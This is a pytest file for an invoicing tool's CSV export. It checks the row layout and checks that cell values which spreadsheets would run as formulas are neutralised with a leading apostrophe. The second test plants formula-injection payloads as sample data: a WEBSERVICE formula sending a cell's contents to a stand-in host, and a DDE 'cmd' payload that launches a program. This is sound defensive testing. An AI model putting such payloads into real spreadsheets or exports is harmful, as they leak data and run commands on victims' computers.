"""Invoices out as a CSV (core/spreadsheet.py): plain numbers, and nothing a spreadsheet would run."""

from __future__ import annotations

import csv

from saldo.core import sample, spreadsheet
from saldo.core.store import Library


def test_one_row_per_invoice_with_plain_numbers(tmp_path):
    lib = sample.fill(Library(tmp_path / "data").load())
    path = tmp_path / "out.csv"
    spreadsheet.write_csv(lib.ordered(), lib.businesses, path)
    rows = list(csv.reader(path.read_text(encoding="utf-8-sig").splitlines()))
    assert rows[0] == spreadsheet.COLUMNS and len(rows) == 5
    total = rows[0].index("Total")
    assert all(r[total].replace(".", "").isdigit() for r in rows[1:])
    assert {r[rows[0].index("Status")] for r in rows[1:]} == {"Draft", "Sent", "Overdue", "Paid"}
    assert not list(tmp_path.glob(".out.csv.*"))  # no temp file left behind


def test_csv_cant_carry_formulas(tmp_path):
    lib = sample.fill(Library(tmp_path / "data").load())
    inv = lib.ordered()[0]
    inv.client.name = '=WEBSERVICE("http://x/?"&A2)'
    inv.project = "+cmd|' /C calc'!A0"
    path = tmp_path / "out.csv"
    spreadsheet.write_csv([inv], lib.businesses, path)
    text = path.read_text(encoding="utf-8-sig")
    assert "'=WEBSERVICE" in text and "'+cmd" in text
    assert spreadsheet.safe_cell("-50") == "-50" and spreadsheet.safe_cell("@SUM(A1)") == "'@SUM(A1)"
